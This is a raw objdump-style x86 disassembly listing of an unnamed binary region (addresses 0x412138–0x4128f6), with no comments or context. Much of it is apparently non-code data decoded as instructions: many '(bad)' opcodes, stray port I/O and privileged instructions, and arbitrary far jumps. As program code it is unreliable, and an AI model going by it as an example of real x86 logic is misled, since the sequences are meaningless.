  412138:	sub    eax,0x1dc8f62b
  41213d:	nop
  41213e:	pop    ds
  41213f:	xchg   esi,eax
  412140:	xchg   esi,eax
  412141:	mov    esp,0xf53cc908
  412146:	test   esp,edx
  412148:	inc    edi
  412149:	imul   esi,DWORD PTR [ecx],0xffffff8e
  41214c:	inc    esi
  41214d:	std    
  41214e:	mov    esi,0x7f8f6e3b
  412153:	jl     0x41210b
  412155:	xchg   ebp,eax
  412156:	icebp  
  412157:	inc    ecx
  412158:	sahf   
  412159:	or     al,0xb1
  41215b:	shl    BYTE PTR [esi+ebx*8],0xe4
  41215f:	loop   0x4121b6
  412161:	or     al,0xb9
  412163:	and    BYTE PTR [ebp-0x17],al
  412166:	pusha  
  412167:	(bad)  
  412168:	or     BYTE PTR [edi+0x1f],ch
  41216b:	aaa    
  41216c:	shl    esi,0xba
  41216f:	in     al,0xe5
  412171:	add    DWORD PTR [ebx+0x52f7d327],0x1288159a
  41217b:	cmp    edi,edi
  41217d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41217e:	or     eax,0x1550e7e9
  412183:	imul   edi,DWORD PTR [esi-0x54],0xf
  412187:	hlt    
  412188:	sbb    al,0x47
  41218a:	mov    dl,bl
  41218c:	push   fs
  41218e:	mov    BYTE PTR [ecx-0x4f45df25],dl
  412194:	or     ch,ah
  412196:	ss dec edi
  412198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412199:	imul   edx,DWORD PTR [eax-0x67],0x80180e62
  4121a0:	test   BYTE PTR [ebp-0x72d41046],ah
  4121a6:	arpl   di,dx
  4121a8:	dec    ecx
  4121a9:	rcr    cl,1
  4121ab:	out    dx,al
  4121ac:	mov    ds:0xc7271598,eax
  4121b1:	pop    edi
  4121b2:	cwde   
  4121b3:	sub    al,0x9a
  4121b5:	aam    0x7c
  4121b7:	jno    0x41215f
  4121b9:	inc    eax
  4121ba:	fimul  DWORD PTR [eax-0x62825b72]
  4121c0:	pop    ecx
  4121c1:	daa    
  4121c2:	inc    edx
  4121c3:	jns    0x41216c
  4121c5:	sahf   
  4121c6:	icebp  
  4121c7:	fs xor al,0x7f
  4121ca:	aaa    
  4121cb:	adc    DWORD PTR [ecx-0x66201752],0xdb8dde7e
  4121d5:	ss xchg esi,eax
  4121d7:	js     0x412186
  4121d9:	jns    0x412195
  4121db:	sbb    ebx,DWORD PTR [edx+0x3f6232a5]
  4121e1:	lods   eax,DWORD PTR ds:[esi]
  4121e2:	add    dl,BYTE PTR [ebx+ebp*1]
  4121e5:	jo     0x41224c
  4121e7:	mov    ecx,0x748ca29f
  4121ec:	xchg   ecx,eax
  4121ed:	and    eax,0xd55fd29b
  4121f2:	or     esp,esi
  4121f4:	pop    esi
  4121f5:	into   
  4121f6:	inc    esp
  4121f7:	mov    bh,0x29
  4121f9:	mov    WORD PTR [eax-0xe3605d0],ds
  4121ff:	iret   
  412200:	jnp    0x412216
  412202:	add    al,0x8d
  412204:	jae    0x412284
  412206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412207:	jno    0x41224f
  412209:	test   BYTE PTR [ebp+0x7881bfda],cl
  41220f:	ds push 0xffffff9e
  412212:	mov    esp,0xcd90dd9e
  412217:	push   cs
  412218:	adc    DWORD PTR [ecx-0x5d2fd54b],esp
  41221e:	retf   
  41221f:	push   esi
  412220:	fnstsw WORD PTR [edi+0x2c5c18af]
  412226:	jp     0x41226d
  412228:	addr16 mov esp,esp
  41222b:	pusha  
  41222c:	sbb    ecx,edi
  41222e:	icebp  
  41222f:	shl    DWORD PTR [esi],cl
  412231:	or     dl,0x40
  412234:	jae    0x412276
  412236:	xor    al,0xb2
  412238:	push   ds
  412239:	sbb    al,0x22
  41223b:	js     0x4121e0
  41223d:	in     al,dx
  41223e:	popf   
  41223f:	int3   
  412240:	imul   BYTE PTR [edi+ebx*4+0x4a]
  412244:	aaa    
  412245:	les    eax,FWORD PTR [ebp+0xe74dbf]
  41224b:	push   cs
  41224c:	mov    WORD PTR [esp+ebp*2+0x6b],ss
  412250:	add    eax,0xd29c2e08
  412255:	loop   0x412260
  412257:	cld    
  412258:	fs fucomi st,st(3)
  41225b:	add    BYTE PTR [eax+edx*8+0x30],ah
  41225f:	dec    eax
  412260:	jb     0x4121e9
  412262:	sbb    ebx,DWORD PTR [edi-0x52]
  412265:	test   BYTE PTR [eax-0x21],bl
  412268:	mov    ah,0xd5
  41226a:	push   ss
  41226b:	arpl   WORD PTR [edx],si
  41226d:	in     al,0x52
  41226f:	(bad)  
  412270:	(bad)  
  412271:	sar    DWORD PTR [ebx],cl
  412273:	mov    dl,dh
  412275:	scas   al,BYTE PTR es:[edi]
  412276:	mov    cl,0x46
  412278:	xchg   ebx,eax
  412279:	cmp    ecx,DWORD PTR [eax+0x48]
  41227c:	cli    
  41227d:	dec    ebx
  41227e:	sbb    bl,BYTE PTR [esi+esi*2+0x20]
  412282:	xor    al,0xb5
  412284:	mov    bl,0xf6
  412286:	xchg   DWORD PTR [ebp-0x16b2310e],ebp
  41228c:	jno    0x4122b8
  41228e:	jb     0x412254
  412290:	les    ebp,FWORD PTR [ecx+0x9]
  412293:	popf   
  412294:	out    dx,eax
  412295:	pusha  
  412296:	popf   
  412297:	imul   edi,DWORD PTR [ebx+0x51bd19a6],0xffffff86
  41229e:	xchg   edi,eax
  41229f:	push   es
  4122a0:	mov    ebp,0x5f0db44e
  4122a5:	(bad)  
  4122a7:	jne    0x41222c
  4122a9:	pushf  
  4122aa:	data16 test al,0xab
  4122ad:	sub    al,dh
  4122af:	adc    ebx,DWORD PTR [eax+ebp*1]
  4122b2:	es push edx
  4122b4:	addr16 dec esi
  4122b6:	push   cs
  4122b7:	mov    eax,0x455a4e7f
  4122bc:	fmul   DWORD PTR [edx+0x7d]
  4122bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122c0:	call   0xb117:0xc0fc769b
  4122c7:	fstp   QWORD PTR [esp+eiz*2-0x423e1b2]
  4122ce:	sub    DWORD PTR [edx],0x50ab3668
  4122d4:	mov    bl,0x81
  4122d6:	mov    ecx,0xedff4453
  4122db:	inc    ebp
  4122dc:	stc    
  4122dd:	xor    ch,BYTE PTR [ecx+0x86a8490]
  4122e3:	adc    edi,edi
  4122e5:	imul   eax,DWORD PTR [ebp-0x282742a2],0x43
  4122ec:	dec    ebx
  4122ed:	xor    al,BYTE PTR [ecx-0x61]
  4122f0:	(bad)  
  4122f1:	fdiv   QWORD PTR [esi-0x1d]
  4122f4:	jg     0x412332
  4122f6:	hlt    
  4122f7:	in     al,0xb2
  4122f9:	xchg   ebx,eax
  4122fa:	(bad)  
  4122fb:	fs ror edx,0x5a
  4122ff:	push   eax
  412300:	xor    eax,0x46da1f40
  412305:	fisttp WORD PTR ds:0x2cb572c2
  41230b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41230c:	add    eax,DWORD PTR [esi-0x5e]
  41230f:	xchg   esp,eax
  412310:	and    DWORD PTR [edx],esp
  412312:	out    dx,eax
  412313:	mov    ds:0x4a7f5253,al
  412318:	adc    DWORD PTR [esi+ecx*4],0xffffff8d
  41231c:	pusha  
  41231d:	loope  0x412306
  41231f:	out    dx,al
  412320:	jno    0x412360
  412322:	leave  
  412323:	lock repz test eax,0xdf5fd083
  41232a:	outs   dx,DWORD PTR ds:[esi]
  41232b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232c:	out    0x9d,eax
  41232e:	adc    edx,DWORD PTR [ebx-0x671be1ad]
  412334:	ins    BYTE PTR es:[edi],dx
  412335:	mov    ecx,0x4cb61e57
  41233a:	push   esp
  41233b:	jmp    0x4123b6
  41233d:	hlt    
  41233e:	in     al,dx
  41233f:	mov    eax,ds:0xf243c6a5
  412344:	int    0x66
  412346:	push   eax
  412347:	ss pop esp
  412349:	sub    eax,0x40fd679d
  41234e:	std    
  41234f:	add    eax,0x83db1960
  412354:	ds mov eax,0x7bea6de4
  41235a:	push   ebx
  41235b:	push   eax
  41235c:	ror    DWORD PTR [ebx+ebp*1-0x1d7a6fdd],1
  412363:	push   0xffffffdc
  412365:	push   ss
  412366:	jecxz  0x412329
  412368:	inc    edx
  412369:	(bad)  
  41236a:	iret   
  41236b:	xchg   DWORD PTR [edi-0x4e610a78],eax
  412371:	dec    esp
  412372:	inc    edi
  412373:	dec    esi
  412374:	jb     0x41232b
  412376:	cmp    DWORD PTR [esi-0x372f1ac6],esp
  41237c:	ins    BYTE PTR es:[edi],dx
  41237d:	in     eax,0x1a
  41237f:	test   bl,ah
  412381:	sahf   
  412382:	and    BYTE PTR [edx],dl
  412384:	int    0x19
  412386:	repz add bh,BYTE PTR [esi]
  412389:	mov    ch,0xea
  41238b:	in     al,dx
  41238c:	lds    ebx,FWORD PTR [edx]
  41238e:	xchg   ebp,eax
  41238f:	mov    ecx,0xb11f6513
  412394:	jl     0x412359
  412396:	mov    ah,0x8
  412398:	inc    ecx
  412399:	js     0x41240e
  41239b:	mov    al,0x6c
  41239d:	ds stos DWORD PTR es:[edi],eax
  41239f:	out    dx,al
  4123a0:	add    eax,0xef0564a0
  4123a5:	add    edx,DWORD PTR [edx]
  4123a7:	push   0x4f
  4123a9:	xchg   bl,al
  4123ab:	xchg   DWORD PTR [esp+ebx*2],esi
  4123ae:	adc    ah,BYTE PTR [eax]
  4123b0:	pop    esp
  4123b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123b2:	in     eax,dx
  4123b3:	lds    ecx,FWORD PTR [ebx+0x7d]
  4123b6:	popa   
  4123b7:	sbb    al,0xc5
  4123b9:	std    
  4123ba:	imul   edx,DWORD PTR [ecx],0xdea2d8d1
  4123c0:	pop    ss
  4123c1:	mov    eax,0xb25eac72
  4123c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c7:	outs   dx,BYTE PTR ds:[esi]
  4123c8:	inc    edi
  4123c9:	jecxz  0x4123b9
  4123cb:	pop    ecx
  4123cc:	adc    eax,0xe0487134
  4123d1:	xlat   BYTE PTR ds:[ebx]
  4123d2:	in     al,dx
  4123d3:	bound  esi,QWORD PTR [ebx+0x24]
  4123d6:	lahf   
  4123d7:	dec    esp
  4123d8:	adc    DWORD PTR [edi+0x58db2d9e],ebx
  4123de:	cmp    eax,0xb003cf48
  4123e3:	stos   DWORD PTR es:[edi],eax
  4123e4:	xor    bh,dl
  4123e6:	push   ds
  4123e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e8:	idiv   BYTE PTR [eax]
  4123ea:	mov    gs,ecx
  4123ec:	mov    eax,DWORD PTR [esi-0x60]
  4123ef:	test   al,0x76
  4123f1:	scas   al,BYTE PTR es:[edi]
  4123f2:	loopne 0x4123cc
  4123f4:	dec    edi
  4123f5:	dec    esp
  4123f6:	pop    es
  4123f7:	retf   0x347e
  4123fa:	jbe    0x41243b
  4123fc:	add    bh,al
  4123fe:	inc    edi
  4123ff:	dec    esp
  412400:	(bad)  
  412401:	or     al,0x31
  412403:	aas    
  412404:	mov    dh,0xc8
  412406:	int3   
  412407:	(bad)  
  412408:	mov    al,0xc3
  41240a:	xor    eax,0x9f661bd7
  41240f:	scas   al,BYTE PTR es:[edi]
  412410:	ins    DWORD PTR es:[edi],dx
  412411:	aam    0x18
  412413:	sar    BYTE PTR [ecx+ebp*8-0x1fe91f8],1
  41241a:	fwait
  41241b:	lock add dl,BYTE PTR [edi+0x1089dea1]
  412422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412423:	dec    ecx
  412424:	add    BYTE PTR [ecx+ebp*4+0x7a],0x11
  412429:	mov    ch,0x4a
  41242b:	out    0xdc,al
  41242d:	in     al,dx
  41242e:	fsub   QWORD PTR [ecx+0x5176a430]
  412434:	jge    0x412430
  412436:	in     al,0x74
  412438:	je     0x41243e
  41243a:	test   BYTE PTR [ecx],0xc4
  41243d:	mov    DWORD PTR [edi],ecx
  41243f:	cmp    DWORD PTR [ebp-0x72],eax
  412442:	outs   dx,DWORD PTR ds:[esi]
  412443:	sldt   WORD PTR [ebp-0x43a30246]
  41244a:	lock out 0x27,al
  41244d:	ret    0x4c3a
  412450:	sbb    BYTE PTR [edx-0x13a70d38],dl
  412456:	nop
  412457:	xchg   ecx,eax
  412458:	dec    ebp
  412459:	xchg   ebp,eax
  41245a:	es push ebp
  41245c:	(bad)  
  41245d:	push   esp
  41245e:	imul   ebx,DWORD PTR [esi+0x6aa78f37],0x6a
  412465:	add    esi,ecx
  412467:	out    0x24,al
  412469:	popa   
  41246a:	xchg   edi,eax
  41246b:	push   ebp
  41246c:	xor    eax,0x78f2ed24
  412471:	loope  0x412498
  412473:	and    DWORD PTR [esp+eiz*2+0x4b],edx
  412477:	cdq    
  412478:	and    BYTE PTR [edx-0x5c],dh
  41247b:	int    0x2c
  41247d:	fisubr WORD PTR [esi-0x2f]
  412480:	ficom  DWORD PTR [ecx-0x40]
  412483:	imul   ebx,DWORD PTR [eax-0x30],0x24
  412487:	mov    ebx,?
  412489:	in     eax,0x2a
  41248b:	sahf   
  41248c:	or     al,0x56
  41248e:	mov    bh,0x4a
  412490:	mov    ds,WORD PTR [ecx]
  412492:	sbb    eax,DWORD PTR [ebx-0x15]
  412495:	daa    
  412496:	xor    BYTE PTR [eax-0x4d2b44],cl
  41249c:	mov    cl,0xb6
  41249e:	fistp  QWORD PTR [edx+0x2c8b2d26]
  4124a4:	mov    al,0x20
  4124a6:	pop    eax
  4124a7:	imul   edi,DWORD PTR [ebx-0x7c367687],0x9af4f001
  4124b1:	mov    dh,0x9d
  4124b3:	sbb    ch,BYTE PTR ds:0x3bce20
  4124b9:	test   eax,0x4a0a20fe
  4124be:	or     edx,DWORD PTR [eax+0x76]
  4124c1:	rol    BYTE PTR [eax+0x3b291111],cl
  4124c7:	stc    
  4124c8:	dec    ebp
  4124c9:	outs   dx,BYTE PTR ds:[esi]
  4124ca:	mov    esi,0x58f51d4b
  4124cf:	fisub  WORD PTR [eax+0x5a]
  4124d2:	and    ebp,DWORD PTR [esi+0x7d3db03e]
  4124d8:	mov    BYTE PTR [ebx-0x2f],dl
  4124db:	xor    DWORD PTR [esi],esp
  4124dd:	out    dx,eax
  4124de:	outs   dx,DWORD PTR fs:[esi]
  4124e0:	lea    ebp,[edx+0x66]
  4124e3:	push   0x163db90b
  4124e8:	or     eax,ebp
  4124ea:	pop    es
  4124eb:	sbb    al,0x7e
  4124ed:	test   edx,0xbe9d168d
  4124f3:	dec    eax
  4124f4:	outs   dx,BYTE PTR ds:[esi]
  4124f5:	pop    edx
  4124f6:	stos   DWORD PTR es:[edi],eax
  4124f7:	xlat   BYTE PTR ds:[ebx]
  4124f8:	cli    
  4124f9:	(bad)  
  4124fa:	adc    edx,DWORD PTR [esi-0x30]
  4124fd:	cli    
  4124fe:	or     bh,BYTE PTR [ecx-0x3f]
  412501:	or     edx,esi
  412503:	xchg   ebp,eax
  412504:	jecxz  0x4124aa
  412506:	retf   0x2aaf
  412509:	pop    ss
  41250a:	popa   
  41250b:	std    
  41250c:	xor    al,0x5c
  41250e:	cmp    eax,0xa2e2e68c
  412513:	fsub   DWORD PTR [eax-0x69]
  412517:	mov    edi,0x823e8441
  41251c:	push   es
  41251d:	mov    ah,0x3d
  41251f:	mov    ebx,0xd379071f
  412524:	retf   
  412525:	call   0x79913206
  41252a:	jae    0x412543
  41252c:	sub    ch,ah
  41252e:	jno    0x412526
  412530:	aad    0x5
  412532:	sbb    al,0xa6
  412534:	mov    bh,0xc5
  412536:	ja     0x4124cb
  412538:	inc    edx
  412539:	sbb    BYTE PTR [edi-0x25],ch
  41253c:	pop    ss
  41253d:	xchg   esp,eax
  41253e:	cs pop ebx
  412540:	mov    edi,0xbf0487e4
  412545:	fist   WORD PTR [eax+0x11]
  412548:	adc    al,0x2a
  41254a:	std    
  41254b:	repz adc bh,BYTE PTR [edx]
  41254e:	xlat   BYTE PTR ds:[ebx]
  41254f:	dec    esp
  412550:	mov    ch,0xff
  412552:	sbb    BYTE PTR [ecx-0x2c6e3d43],al
  412558:	sbb    BYTE PTR [ebx],bh
  41255a:	sar    DWORD PTR [edx-0x1ed019a],cl
  412560:	cmp    al,0x64
  412562:	mov    esp,0x53697ead
  412567:	push   es
  412568:	test   DWORD PTR ds:0x894e2d07,0x51287ca
  412572:	test   BYTE PTR [esi+0xf],dl
  412575:	retf   0x1591
  412578:	or     ebp,DWORD PTR [ebp+0x53ca3fb3]
  41257e:	ja     0x4125af
  412580:	aas    
  412581:	mov    edi,0x116f450f
  412586:	aad    0xa8
  412588:	sbb    DWORD PTR [edx+0x55],edi
  41258b:	inc    esi
  41258c:	aas    
  41258d:	in     al,dx
  41258e:	pop    ss
  41258f:	int    0x8c
  412591:	dec    ebp
  412592:	ins    DWORD PTR es:[edi],dx
  412593:	push   edx
  412594:	jb     0x412564
  412596:	loope  0x4125bb
  412598:	pop    dx
  41259a:	or     DWORD PTR [ecx-0x7e8dbe5c],eax
  4125a0:	sub    eax,0xcc1b46ae
  4125a5:	pop    esi
  4125a6:	in     eax,dx
  4125a7:	loop   0x412607
  4125a9:	dec    edi
  4125aa:	clc    
  4125ab:	pop    esi
  4125ac:	mov    edi,ebp
  4125ae:	xchg   ecx,eax
  4125af:	mov    ah,BYTE PTR [esp+ebp*8]
  4125b2:	sub    dl,dl
  4125b4:	lods   eax,DWORD PTR ds:[esi]
  4125b5:	sbb    BYTE PTR [edx-0x1f195810],0x46
  4125bc:	mov    edx,DWORD PTR [eax-0x3a9aa424]
  4125c2:	inc    ebp
  4125c3:	sbb    al,0x5f
  4125c5:	or     DWORD PTR [ebp-0x106fe37a],edx
  4125cb:	mov    edx,0x22c7db9c
  4125d0:	or     eax,0x182e0902
  4125d5:	(bad)  
  4125d6:	sbb    BYTE PTR [edi],dl
  4125d8:	dec    ecx
  4125d9:	add    al,0x9a
  4125db:	xchg   ecx,ecx
  4125dd:	into   
  4125de:	scas   al,BYTE PTR es:[edi]
  4125df:	cmp    dh,al
  4125e1:	outs   dx,DWORD PTR ds:[esi]
  4125e2:	push   edi
  4125e3:	nop
  4125e4:	sub    ebp,edi
  4125e6:	and    eax,0x7f5a7255
  4125eb:	jne    0x41258b
  4125ed:	pop    ebp
  4125ee:	mov    bl,0xe
  4125f0:	xchg   BYTE PTR [ecx+0x4a],ch
  4125f3:	pop    eax
  4125f4:	loope  0x412627
  4125f6:	pop    ds
  4125f7:	cmp    ecx,DWORD PTR [ecx-0x48f35b1e]
  4125fd:	push   0xd37674d2
  412602:	xor    al,0x1c
  412604:	xchg   di,ax
  412606:	and    eax,0xbce1e78b
  41260b:	loope  0x412679
  41260d:	push   ds
  41260e:	xchg   ebx,eax
  41260f:	jmp    0xc1c515f6
  412614:	and    BYTE PTR [esi+edx*8-0x208c9da8],cl
  41261b:	cmp    eax,0x85b4432e
  412620:	and    al,0xb2
  412622:	outs   dx,DWORD PTR ds:[esi]
  412623:	test   DWORD PTR [edi],0x33d69a24
  412629:	push   eax
  41262a:	push   ebp
  41262b:	aaa    
  41262c:	inc    esp
  41262d:	sahf   
  41262e:	pop    ds
  41262f:	retf   0x7087
  412632:	shr    dl,0xaa
  412635:	call   0xe09d166
  41263a:	sbb    al,0x8f
  41263c:	in     al,dx
  41263d:	pop    ecx
  41263e:	inc    esp
  41263f:	jo     0x412682
  412641:	out    dx,eax
  412642:	rol    DWORD PTR [ecx-0x13],0x65
  412646:	mov    ebx,0x3e32816f
  41264b:	mov    eax,0x834c4c13
  412650:	jmp    0x4126b3
  412652:	out    dx,al
  412653:	in     al,dx
  412654:	dec    edi
  412655:	pop    eax
  412656:	jnp    0x412668
  412658:	out    dx,al
  412659:	or     BYTE PTR [esi-0x80],al
  41265c:	out    0xf2,al
  41265e:	adc    eax,0x9146eea2
  412663:	loop   0x412602
  412665:	mov    al,0xd
  412667:	or     dh,BYTE PTR [edx]
  412669:	in     eax,0x3d
  41266b:	enter  0x2da,0x88
  41266f:	add    dh,dh
  412671:	or     al,0x32
  412673:	out    0xa0,eax
  412675:	xor    eax,0x30522550
  41267a:	les    edi,FWORD PTR [ebx-0x6d]
  41267d:	pop    esi
  41267e:	rol    BYTE PTR [ebx],cl
  412680:	xchg   ebx,eax
  412681:	adc    eax,0xaa3c12c5
  412686:	add    al,0x95
  412688:	dec    edi
  412689:	push   eax
  41268a:	xlat   BYTE PTR ds:[ebx]
  41268b:	cs pop es
  41268d:	(bad)  
  41268e:	cmp    esi,eax
  412690:	inc    ebp
  412691:	ret    
  412692:	add    BYTE PTR [ecx],al
  412694:	mov    eax,0x78510e42
  412699:	or     eax,0x3f621834
  41269e:	xchg   esi,eax
  41269f:	jmp    0x412694
  4126a1:	rcl    BYTE PTR ds:[esi-0x20],0xe8
  4126a6:	push   edi
  4126a7:	adc    DWORD PTR [edx-0x1f],edi
  4126aa:	ret    0xf2f1
  4126ad:	push   ebp
  4126ae:	adc    DWORD PTR [edx-0x53dfcca7],esi
  4126b4:	js     0x412638
  4126b6:	xchg   ebp,eax
  4126b7:	in     al,dx
  4126b8:	push   ss
  4126b9:	clc    
  4126ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126bb:	inc    ebx
  4126bc:	outs   dx,DWORD PTR ds:[esi]
  4126bd:	push   ds
  4126be:	push   eax
  4126bf:	popa   
  4126c0:	or     ebp,DWORD PTR [edx-0x54]
  4126c3:	push   ds
  4126c4:	inc    edx
  4126c5:	lods   eax,DWORD PTR ds:[esi]
  4126c6:	fstp   QWORD PTR [ecx+0x73]
  4126c9:	loop   0x4126df
  4126cb:	in     eax,0x5e
  4126cd:	call   0xfa760608
  4126d2:	cmp    eax,0xc8a42363
  4126d7:	fisubr DWORD PTR [esi+0x28]
  4126da:	sub    DWORD PTR [eax+0x3856c0a5],ebp
  4126e0:	sub    ecx,DWORD PTR [ecx]
  4126e2:	sub    eax,0xd48a4917
  4126e7:	mov    DWORD PTR [esp+0x41],edi
  4126eb:	xlat   BYTE PTR ds:[ebx]
  4126ec:	sbb    DWORD PTR [ebx-0x49],edi
  4126ef:	shr    ah,0x73
  4126f2:	mov    dh,0xc9
  4126f4:	hlt    
  4126f5:	mov    edx,0xe675094b
  4126fa:	xchg   esi,eax
  4126fb:	xchg   DWORD PTR [esi],edi
  4126fd:	sti    
  4126fe:	fs pop ecx
  412700:	je     0x41269b
  412702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412703:	out    0x9d,eax
  412705:	sub    DWORD PTR [edi],ebp
  412707:	shl    BYTE PTR [eax-0x5fb31b4b],1
  41270d:	mov    esi,DWORD PTR [edx]
  41270f:	cld    
  412710:	sbb    cl,BYTE PTR [ebx+0x3e]
  412713:	push   ebx
  412714:	adc    bh,BYTE PTR [edi]
  412716:	mov    esi,DWORD PTR [edx+edi*8+0x4e]
  41271a:	or     eax,0x6c08575e
  41271f:	cmp    ecx,DWORD PTR [edx+0x6a]
  412722:	sub    eax,0xddf69e90
  412727:	inc    esi
  412728:	sbb    al,0x54
  41272a:	aam    0x0
  41272c:	fimul  WORD PTR [edi-0xef58414]
  412732:	test   eax,0xa5b553d8
  412737:	out    dx,al
  412738:	xchg   ecx,eax
  412739:	cmp    ebp,DWORD PTR [edi]
  41273b:	nop
  41273c:	dec    ecx
  41273d:	jge    0x41272f
  41273f:	push   esp
  412740:	jmp    0x4126c6
  412742:	(bad)  
  412744:	or     BYTE PTR [esi+0x6db278ed],bl
  41274a:	mov    ch,dl
  41274c:	mov    cl,0xaf
  41274e:	pop    ecx
  41274f:	xlat   BYTE PTR ds:[ebx]
  412750:	sub    eax,0x1ffe6403
  412755:	sbb    eax,0xffffffb4
  412758:	ja     0x4127a4
  41275a:	mov    DWORD PTR [edi-0x7013a226],ecx
  412760:	or     eax,0xa710f5d0
  412765:	push   0x89e2d126
  41276a:	mov    edx,0xfecde82d
  41276f:	lods   eax,DWORD PTR ds:[esi]
  412770:	mov    ch,0xe4
  412772:	adc    DWORD PTR [edi],edx
  412774:	xchg   esi,eax
  412775:	es cmp edx,esi
  412778:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41277a:	outs   dx,BYTE PTR ds:[esi]
  41277b:	ja     0x4127d4
  41277d:	and    edx,DWORD PTR [edi+0x80ef80a]
  412783:	stos   DWORD PTR es:[edi],eax
  412784:	jns    0x4127ab
  412786:	lock test eax,0xd97333b8
  41278c:	data16 jmp 0x412790
  41278f:	mov    ecx,0xe413aad8
  412794:	pusha  
  412795:	ds aam 0x25
  412798:	adc    eax,0xc0c71ed3
  41279d:	pop    esp
  41279e:	lds    eax,FWORD PTR [edx+0x61]
  4127a1:	leave  
  4127a2:	retf   0x2938
  4127a5:	call   0xb846075d
  4127aa:	pop    edi
  4127ab:	sub    al,0x4f
  4127ad:	inc    edx
  4127ae:	loope  0x412800
  4127b0:	jmp    0xe02c:0xcae627e7
  4127b7:	test   ah,al
  4127b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ba:	(bad)  
  4127bb:	out    dx,eax
  4127bc:	mov    ch,0x73
  4127be:	cmp    al,dh
  4127c0:	push   0x41788260
  4127c5:	imul   eax,DWORD PTR [edx],0xffffffca
  4127c8:	fsubr  DWORD PTR [ecx+0x5000e667]
  4127ce:	push   ds
  4127cf:	pusha  
  4127d0:	xchg   esi,eax
  4127d1:	or     eax,0x814e16da
  4127d6:	push   edx
  4127d7:	adc    eax,0xe610e5f7
  4127dc:	addr16 ss loope 0x41285f
  4127e0:	sub    BYTE PTR [ecx+eax*8],bh
  4127e3:	cmp    al,0x92
  4127e5:	repz aam 0xad
  4127e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e9:	push   eax
  4127ea:	jb     0x41277c
  4127ec:	vmovsd xmm3,xmm4,xmm5
  4127f0:	adc    eax,0x1771d56a
  4127f5:	adc    BYTE PTR [esi],cl
  4127f7:	sub    esp,DWORD PTR [eax+0x9]
  4127fa:	cmp    DWORD PTR [ebp+0x3e],esi
  4127fd:	push   ds
  4127fe:	jge    0x4127db
  412800:	lahf   
  412801:	(bad)  
  412802:	in     al,0xee
  412804:	cmp    ch,cl
  412806:	dec    esi
  412807:	hlt    
  412808:	mov    ch,0x4a
  41280a:	gs mov dh,0x7f
  41280d:	jge    0x4127c3
  41280f:	std    
  412810:	sub    al,0xf
  412812:	cmp    al,0x9d
  412814:	jmp    0x177e:0x3c76817e
  41281b:	shl    DWORD PTR [ebp-0x3303a88c],0x4f
  412822:	inc    ecx
  412823:	cmp    al,0x77
  412825:	mov    ch,BYTE PTR [ecx-0x26c001dd]
  41282b:	loop   0x4127d0
  41282d:	or     al,0xfa
  41282f:	mov    cl,0x1b
  412831:	inc    ecx
  412832:	je     0x41282d
  412834:	xchg   esp,eax
  412835:	ja     0x412871
  412837:	sub    eax,0x56d702c
  41283c:	and    esp,ebp
  41283e:	pop    ecx
  41283f:	das    
  412840:	cwde   
  412841:	inc    esi
  412842:	das    
  412843:	lock xor ah,BYTE PTR [edx]
  412846:	pop    edx
  412847:	popa   
  412848:	jae    0x41286b
  41284a:	mov    dh,0xee
  41284c:	int3   
  41284d:	mov    ah,BYTE PTR [ebx]
  41284f:	test   DWORD PTR [edi-0xe5edc85],ebp
  412855:	ss ja  0x412872
  412858:	mov    bl,0xa5
  41285a:	inc    ebp
  41285b:	fadd   QWORD PTR [ecx]
  41285d:	sbb    esi,ebx
  41285f:	and    BYTE PTR [esi-0x7072b326],dh
  412865:	call   0xfba5a3c
  41286a:	(bad)  
  41286b:	div    DWORD PTR [ebp-0x7cdd3c48]
  412871:	or     eax,0xaa6a0ca4
  412876:	xor    BYTE PTR [eax-0x6a],bh
  412879:	add    eax,DWORD PTR [ebx+0x1]
  41287c:	push   edi
  41287d:	cmp    ebp,DWORD PTR [ebx+ecx*4-0x66]
  412881:	shl    BYTE PTR [ecx],0x95
  412884:	sub    al,0xf9
  412886:	(bad)  
  412887:	xchg   ebx,eax
  412888:	sbb    edi,esi
  41288a:	pop    ds
  41288b:	jae    0x41283b
  41288d:	xor    eax,0x60177f6d
  412892:	cmp    al,0xa8
  412894:	scas   al,BYTE PTR es:[edi]
  412895:	ja     0x412903
  412897:	test   al,0xe6
  412899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41289a:	out    dx,al
  41289b:	and    eax,0xc974aad
  4128a0:	jmp    0xd0a:0x4f7f2772
  4128a7:	fstp   QWORD PTR [esi+0x76]
  4128aa:	xchg   ecx,eax
  4128ab:	cli    
  4128ac:	shr    cl,cl
  4128ae:	iret   
  4128af:	das    
  4128b0:	dec    edi
  4128b1:	ret    0x5e6f
  4128b4:	test   al,0xcf
  4128b6:	sub    eax,edx
  4128b8:	push   esi
  4128b9:	xchg   edx,eax
  4128ba:	jae    0x412895
  4128bc:	mov    dl,0xd7
  4128be:	loopne 0x4128f0
  4128c0:	xlat   BYTE PTR ds:[ebx]
  4128c1:	pop    ebx
  4128c2:	cmp    esp,ebx
  4128c4:	push   ds
  4128c5:	mov    BYTE PTR [edx+ebp*1+0x46],bl
  4128c9:	dec    esp
  4128ca:	jmp    0xaec3:0x3fd3412
  4128d1:	in     eax,0xed
  4128d3:	mov    edi,0x9c7acc13
  4128d8:	imul   eax,DWORD PTR [ebx+0x71],0x53c6dfc7
  4128df:	fcomip st,st(3)
  4128e1:	mov    ds:0xedd6fea3,al
  4128e6:	cwde   
  4128e7:	nop
  4128e8:	(bad)  [esi]
  4128ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128eb:	retf   0xcca7
  4128ee:	push   esp
  4128ef:	test   BYTE PTR [esi-0x7db81da2],ah
  4128f5:	stc    
  4128f6:	mov    cl,ah
